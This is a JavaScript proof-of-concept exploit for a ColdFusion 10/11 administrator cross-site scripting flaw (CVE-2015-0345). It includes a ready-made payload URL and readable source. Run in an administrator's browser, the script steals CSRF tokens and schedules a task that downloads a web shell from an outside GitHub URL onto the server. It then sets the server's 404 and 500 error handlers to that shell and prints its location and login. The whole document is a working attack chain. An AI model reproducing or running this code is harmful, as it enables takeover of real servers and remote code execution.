// Usage: http://127.0.0.1:8500/CFIDE/administrator/filedialog/index.cfm?type=dir%27%2cexpanded%3a%27%5cx2F%27%7d%2cfunction%28file%29%7bpath%20%3d%20file%3bdocument%2egetElementById%28%22pathbox%22%29%2evalue%20%3d%20path%3b%7d%29%3bfunction+getCSRFToken%28e%29%7Breturn+%24.get%28e%2Cfunction%28%29%7B%7D%29%7Dfunction+getFullPath%28%29%7Breturn+%24.get%28%22%2FCFIDE%2Fadministrator%2Fsettings%2Fmappings.cfm%22%2Cfunction%28e%29%7Bb%3D%22%2F.%2A%2FCFIDE%26nbsp%22%2Cu%3De.match%28b%29%2Cu%3Du%5B0%5D.replace%28%22%26nbsp%22%2C%22%22%29%7D%29%7Dfunction+postNewTask%28e%2Ct%2Cr%29%7Bvar+n%3D%22csrftoken%3D%22%2Bt%2B%22%26TaskName%3D%22%2Be%2B%22%26Group%3Ddefault%26Start_Date%3D03%252F30%252F2015%26End_Date%3D%26ScheduleType%3DOnce%26StartTimeOnce%3D8%253A44%2BPM%26Interval%3DDaily%26StartTimeDWM%3D%26customInterval_hour%3D0%26customInterval_min%3D0%26customInterval_sec%3D0%26CustomStartTime%3D%26CustomEndTime%3D%26repeatradio%3Drepeatforeverradio%26Repeat%3D%26crontime%3D%26Operation%3DHTTPRequest%26ScheduledURL%3Dhttps%253A%252F%252Fraw.githubusercontent.com%252FhatRiot%252Fclusterd%252Fa748bff7650c2b955fe1bb6a36db340e4ad4a213%252Fsrc%252Flib%252Fcoldfusion%252Ffuze.cfml%26Username%3D%26Password%3D%26Request_Time_out%3D%26proxy_server%3D%26http_proxy_port%3D%26proxy_user%3D%26proxy_password%3D%26publish%3D1%26publish_file%3D%22%2Br%2B%22%26publish_overwrite%3Don%26eventhandler%3D%26exclude%3D%26onmisfire%3D%26onexception%3D%26oncomplete%3D%26priority%3D5%26retrycount%3D3%26advancedmode%3Dtrue%26adminsubmit%3DSubmit%26taskNameOriginal%3D%26groupOriginal%3Ddefault%26modeOriginal%3Dserver%22%3Breturn+%24.ajax%28%7Burl%3A%22%2FCFIDE%2Fadministrator%2Fscheduler%2Fscheduleedit.cfm%22%2Ctype%3A%22POST%22%2Cdata%3An%7D%29%7Dfunction+executeTask%28e%2Ct%29%7Breturn+%24.get%28%22%2FCFIDE%2Fadministrator%2Fscheduler%2Fscheduletasks.cfm%3Fruntask%3D%22%2Be%2B%22%26group%3Ddefault%26mode%3Dserver%26csrftoken%3D%22%2Bt%2Cfunction%28%29%7B%7D%29%7Dfunction+setAsTemplate%28e%2Ct%29%7Bvar+r%3D%22csrftoken%3D%22%2Bt%2B%22%26LimitTime%3Dtrue%26MaxSeconds%3D60%26enablePerAppSettings%3D1%26uuidtoken%3D1%26enablehttpst%3D1%26WsEnable%3D1%26secureJSONPrefix%3D%252F%252F%26outputBufferMax%3D1024%26enableInMemoryFileSystem%3D1%26inMemoryFileSystemLimit%3D100%26inMemoryFileSystemApplicationLimit%3D20%26WatchInterval%3D120%26globalScriptProtect%3DFORM%252CURL%252CCOOKIE%252CCGI%26allowExtraAttributesInAttrColl%3D1%26cFaaSGeneratedFilesExpiryTime%3D30%26ORMSearchIndexDirectory%3D%26CFFORMScriptSrc%3D%252FCFIDE%252Fscripts%252F%26GoogleMapKey%3D%26serverCFC%3DServer%26compileExtForInclude%3D%2A%26applicationCFCLookup%3D1%26MissingTemplateHandler%3D%22%2BencodeURI%28e%29%2B%22%26SiteWideErrorHandler%3D%22%2BencodeURI%28e%29%2B%22%26postParametersLimit%3D100%26postSizeLimit%3D20%26throttleThreshold%3D4%26throttleMemory%3D200%26adminsubmit%3DSubmit%2BChanges%22%3Breturn+%24.ajax%28%7Burl%3A%22%2FCFIDE%2Fadministrator%2Fsettings%2Fserver_settings.cfm%22%2Ctype%3A%22POST%22%2Cdata%3Ar%7D%29%7Dtask_name%3D%22Coldfusion%2520Update%22%2C%24.when%28getCSRFToken%28%22%2FCFIDE%2Fadministrator%2Fscheduler%2Fscheduletasks.cfm%22%29%2CgetFullPath%28%29%29.done%28function%28e%2Ct%29%7Bvar+r%3De%5B2%5D.responseText%2Cn%3D%22%5B0-9A-Z%5D%7B40%7D%22%2Co%3Dr.match%28n%29%5B0%5D%3Bconsole.log%28o%29%3Bvar+a%3Dt%5B2%5D.responseText%2Ci%3D%22%2F.%2A%2FCFIDE%26nbsp%22%2Cs%3Da.match%28i%29%2Cs%3Ds%5B0%5D.replace%28%22%26nbsp%22%2C%22%22%29%3Bconsole.log%28o%2Cs%29%3Bvar+c%3Ds%2B%22%2Fupdate_cf.log%22%2Cl%3D%22%2FCFIDE%2Fupdate_cf.log%22%3B%24.when%28postNewTask%28task_name%2Co%2Cc%29%29.done%28function%28%29%7B%24.when%28executeTask%28task_name%2Co%29%29.done%28function%28%29%7B%24.when%28getCSRFToken%28%22%2FCFIDE%2Fadministrator%2Fsettings%2Fserver_settings.cfm%22%29%29.done%28function%28e%29%7Bvar+t%3De%2Cr%3D%22%5B0-9A-Z%5D%7B40%7D%22%2Cn%3Dt.match%28r%29%5B0%5D%3B%24.when%28setAsTemplate%28l%2Cn%29%29.done%28function%28%29%7Bconsole.log%28%22%25c+Shell+can+be+found+at+%22%2Bdocument.location.origin%2B%22%2F404.cfm%22%2C%22background%3A+%23D14126%3B+color%3A+white%22%29%2Cconsole.log%28%22%25c+Shell+can+be+found+at+%22%2Bdocument.location.origin%2B%22%2F500.cfm%22%2C%22background%3A+%23D14126%3B+color%3A+white%22%29%2Cconsole.log%28%22%25c+Username%3A+god%2C+Password%3A+default%22%2C%22background%3A+%23D14126%3B+color%3A+white%22%29%7D%29%7D%29%7D%29%7D%29%7D%29%3B%24%28%27%23fileTreeDemo_1%27%29%2efileTree%28%7bscript%3a%27%2e%2e%2f%2e%2e%2fadministrator%2fajaxtree%2fjqueryFileTree%2ecfm%3ftype%3ddir&fromjscript=true&dialogStyle=selectDirectory&formelem=ORMSearchIndexDirectory&defaultPath=
// Coldfusion 10, 11 XSS PoC (CVE-2015-0345)

task_name = "Coldfusion%20Update"

$.when(getCSRFToken("/CFIDE/administrator/scheduler/scheduletasks.cfm"), getFullPath()).done(function(a1, a2){
    var csrf_token_page = a1[2].responseText;
    var csrf_token_pattern = "[0-9A-Z]{40}";
    var token = csrf_token_page.match(csrf_token_pattern)[0]
    console.log(token);
    var full_path_page = a2[2].responseText;
    var fp_regex = "\/.*\/CFIDE\&nbsp";
    var full_path = full_path_page.match(fp_regex);
    var full_path = full_path[0].replace("&nbsp", "");
    console.log(token, full_path);
    var final_full_path = full_path + "/update_cf.log";
    var short_path = "/CFIDE/update_cf.log";
    $.when(postNewTask(task_name, token, final_full_path)).done(function(a3){
    	$.when(executeTask(task_name, token)).done(function(a4){
    		$.when(getCSRFToken("/CFIDE/administrator/settings/server_settings.cfm")).done(function(a5){
    			var csrf_token_page = a5;
    			var csrf_token_pattern = "[0-9A-Z]{40}";
			    var token = csrf_token_page.match(csrf_token_pattern)[0]
    			$.when(setAsTemplate(short_path, token)).done(function(a6){
    				console.log("%c Shell can be found at " + document.location.origin + "/404.cfm", 'background: #D14126; color: white')
    				console.log("%c Shell can be found at " + document.location.origin + "/500.cfm", 'background: #D14126; color: white')
    				console.log("%c Username: god, Password: default", 'background: #D14126; color: white')
	    		})
			})
    	})
    })
});

function getCSRFToken(path) {
	return $.get( path, function( data ) {
	});
};

function getFullPath() {
	return $.get("/CFIDE/administrator/settings/mappings.cfm", function(dataloc) {
	     b = '\/.*\/CFIDE\&nbsp';
	     u = dataloc.match(b)
	     u = u[0].replace("&nbsp", "");
	});
};

function postNewTask(taskName, csrfToken, cfPath) {
	var cfData = "csrftoken=" + csrfToken + "&TaskName=" + taskName + "&Group=default&Start_Date=03%2F30%2F2015&End_Date=&ScheduleType=Once&StartTimeOnce=8%3A44+PM&Interval=Daily&StartTimeDWM=&customInterval_hour=0&customInterval_min=0&customInterval_sec=0&CustomStartTime=&CustomEndTime=&repeatradio=repeatforeverradio&Repeat=&crontime=&Operation=HTTPRequest&ScheduledURL=https%3A%2F%2Fraw.githubusercontent.com%2FhatRiot%2Fclusterd%2Fa748bff7650c2b955fe1bb6a36db340e4ad4a213%2Fsrc%2Flib%2Fcoldfusion%2Ffuze.cfml&Username=&Password=&Request_Time_out=&proxy_server=&http_proxy_port=&proxy_user=&proxy_password=&publish=1&publish_file=" + cfPath + "&publish_overwrite=on&eventhandler=&exclude=&onmisfire=&onexception=&oncomplete=&priority=5&retrycount=3&advancedmode=true&adminsubmit=Submit&taskNameOriginal=&groupOriginal=default&modeOriginal=server"
	return $.ajax({
		url: "/CFIDE/administrator/scheduler/scheduleedit.cfm",
		type: "POST",
		data: cfData
	})	
}

function executeTask(taskName, csrfToken) {
	return $.get("/CFIDE/administrator/scheduler/scheduletasks.cfm?runtask=" + taskName + "&group=default&mode=server&csrftoken=" + csrfToken, function(data) {
	})
}

function setAsTemplate(path, csrfToken) {
	var cfData = "csrftoken=" + csrfToken + "&LimitTime=true&MaxSeconds=60&enablePerAppSettings=1&uuidtoken=1&enablehttpst=1&WsEnable=1&secureJSONPrefix=%2F%2F&outputBufferMax=1024&enableInMemoryFileSystem=1&inMemoryFileSystemLimit=100&inMemoryFileSystemApplicationLimit=20&WatchInterval=120&globalScriptProtect=FORM%2CURL%2CCOOKIE%2CCGI&allowExtraAttributesInAttrColl=1&cFaaSGeneratedFilesExpiryTime=30&ORMSearchIndexDirectory=&CFFORMScriptSrc=%2FCFIDE%2Fscripts%2F&GoogleMapKey=&serverCFC=Server&compileExtForInclude=*&applicationCFCLookup=1&MissingTemplateHandler=" + encodeURI(path) + "&SiteWideErrorHandler=" + encodeURI(path) + "&postParametersLimit=100&postSizeLimit=20&throttleThreshold=4&throttleMemory=200&adminsubmit=Submit+Changes"
	return $.ajax({
		url: "/CFIDE/administrator/settings/server_settings.cfm",
		type: "POST",
		data: cfData
	})
}